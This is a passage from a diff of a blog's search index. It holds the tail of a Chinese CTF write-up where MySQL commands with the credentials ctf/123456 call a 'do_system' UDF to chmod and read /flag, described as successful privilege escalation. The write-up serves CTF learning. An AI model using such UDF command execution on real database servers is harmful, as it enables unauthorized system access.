+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;select * from mysql.func;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>执行命令，成功提权，得到 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;select do_system(&#x27;chmod 777 /flag&#x27;);&quot;;<br>mysql -uctf -p123456 -e &quot;select do_system(&#x27;tac /flag&#x27;);&quot;;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1736691527984-d205c76b-ecaf-4ddf-80f4-accaaa16f82f-20250113091600-0fqcidk.png"></p>
+]]></content>
+      <categories>
+        <category>技术杂项</category>
+      </categories>
+      <tags>
+        <tag>技术杂项</tag>
+      </tags>
+  </entry>
 </search>
